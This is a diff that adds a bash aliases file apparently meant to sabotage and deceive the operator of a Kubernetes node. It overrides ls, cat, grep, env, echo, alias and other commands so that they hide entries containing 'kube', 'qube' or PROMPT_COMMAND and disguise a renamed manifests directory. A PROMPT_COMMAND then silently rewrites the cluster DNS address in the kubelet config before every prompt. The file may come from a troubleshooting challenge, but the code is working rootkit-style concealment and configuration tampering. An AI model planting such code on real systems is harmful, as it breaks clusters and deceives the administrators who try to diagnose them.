@@ -1,0 +1,112 @@
+_ls(){
+    /usr/bin/ls $@ | awk '!/(qube)/{print}' | /usr/bin/cat
+}
+alias ls=_ls
+
+_type() {
+    if (( $# > 0 ))
+    then
+        /usr/bin/echo "$@ is a shell builtin"
+    fi
+}
+alias type=_type
+
+alias vi="vim"
+alias nano="vim"
+alias less="less -S"
+# be thankful I didn't alias vim to intercept :-)
+
+_set(){
+    # just copied from box before break
+    /usr/bin/cat /var/lib/dpkg/set
+}
+alias set=_set
+
+_printenv(){
+    /usr/bin/printenv $@ | awk '!/PROMPT_COMMAND/{print}' | /usr/bin/cat
+}
+alias printenv=_printenv
+
+_env(){
+    /usr/bin/env $@ | awk '!/PROMPT_COMMAND/{print}' | /usr/bin/cat
+}
+alias env=_env
+
+
+_unalias(){
+    if (( $@ != "-a" ))
+    then
+        builtin unalias "$@"
+    fi
+}
+alias unalias=_unalias
+
+_alias(){
+    if (( $# < 1 ))
+    then
+        /usr/bin/echo "alias egrep='egrep --color=auto'\r\n"
+        /usr/bin/echo "alias fgrep='fgrep --color=auto'"
+        /usr/bin/echo "alias grep='grep --color=auto'"
+        /usr/bin/echo "alias k='kubectl'"
+        /usr/bin/echo "alias l='ls -CF'"
+        /usr/bin/echo "alias la='ls -A'"
+        /usr/bin/echo "alias ll='ls -alF'"
+        /usr/bin/echo "alias ls='ls --color=auto'"
+    else
+        builtin alias "$@"
+    fi
+}
+alias alias=_alias
+
+_cat() {
+    /usr/bin/cat $@ | awk '!/alias/{print}' | sed 's/qube/kubernetes/g' | /usr/bin/cat
+}
+alias cat=_cat
+
+# not sure this works
+_grep() {
+    /usr/bin/grep $@ | awk '!/kube/{print}' | /usr/bin/cat
+}
+alias grep=_grep
+
+_pushd() {
+    builtin cd $@
+}
+alias pushd=_pushd
+
+_popd() {
+    builtin cd -
+}
+alias popd=_popd
+
+_dirs() {
+    builtin dirs $@ | sed 's/zmanifestz/manifests/g' | /usr/bin/cat
+}
+alias dirs=_dirs
+
+
+_echo() {
+    # if we echo env vars, check it's not BASH_ALIASES or PROMPT_COMMAND
+    if [[ "$*" == "$BASH_ALIASES" ]]
+    then
+        /usr/bin/echo ""
+    elif [[ "$*" == "$PROMPT_COMMAND" ]]
+    then
+        /usr/bin/echo ""
+    else
+       /usr/bin/echo "$@"
+    fi
+}
+alias echo=_echo
+
+wd() {
+    CWD=$(builtin pwd)
+    if [ "${CWD}" = "/etc/kubernetes/zmanifestz" ]; 
+    then
+        echo "/etc/kubernetes/manifests"
+    else
+        echo $CWD
+    fi
+}
+
+export PROMPT_COMMAND="sed -i -e 's/10.96.0.10/10.96.0.1/g' /var/lib/kubelet/config.yaml"
